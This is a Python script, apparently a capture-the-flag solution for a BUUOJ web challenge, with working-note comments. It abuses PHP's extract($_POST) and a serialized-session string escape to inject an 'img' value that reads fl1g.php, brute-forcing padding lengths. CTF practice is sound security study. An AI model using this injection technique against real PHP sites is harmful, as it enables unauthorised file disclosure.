import requests
import time
import base64

url = "http://4079c9cb-e2e3-4d7b-9bc1-a686b76e15a2.node5.buuoj.cn:81/index.php"

session = requests.Session()

target = "fl1g.php"
target_b64 = base64.b64encode(target.encode()).decode()

print(f"Target: {target}, Base64: {target_b64}")

# Let me try using the function field
# 
# The session: {user: guest, function: show_image, img: base64(guest_img.png)}
# 
# If we POST _SESSION[function]=xxx, then:
# 1. $_SESSION['user'] = 'guest'
# 2. $_SESSION['function'] = $function (from GET, 'show_image')
# 3. extract($_POST) - this OVERWRITES $_SESSION['function'] with 'xxx'
# 4. $_SESSION['img'] = base64_encode('guest_img.png')
# 
# So the session becomes: {user: guest, function: xxx, img: base64(guest_img.png)}

# But wait, the code checks if $function == 'show_image' before calling unserialize!
# 
# if($function == 'show_image'){
#     $userinfo = unserialize($serialize_info);
#     echo file_get_contents(base64_decode($userinfo['img']));
# }
# 
# So if we overwrite $function via POST, the check might fail!

# Let me check: extract($_POST) overwrites $function if we POST _SESSION[function]=xxx
# 
# Actually, extract() overwrites variables in the current scope, including $function!
# 
# So if we POST _SESSION[function]=show_image, then $function = 'show_image' after extract.
# 
# But we also need to inject the img value!

# Let me try:
# POST _SESSION[function]=show_image (to pass the check)
# POST _SESSION[user]=flag...inject (to inject the img)

inject = '";s:3:"img";s:9:"' + target_b64 + '";}'

# Try with user field
for n in range(15, 25):
    value = "flag" * n + inject
    data = {
        "_SESSION[user]": value,
        "_SESSION[function]": "show_image"
    }
    r = session.post(url + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text:
        print(f"n={n}: {r.text[:200]}")
        if "flag{" in r.text.lower():
            print("SUCCESS!")
            break

# Try with function field
print("\n=== Trying function field ===")
for n in range(15, 25):
    value = "flag" * n + inject
    data = {
        "_SESSION[function]": value,
    }
    r = session.post(url + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text:
        print(f"n={n}: {r.text[:200]}")
        if "flag{" in r.text.lower():
            print("SUCCESS!")
            break

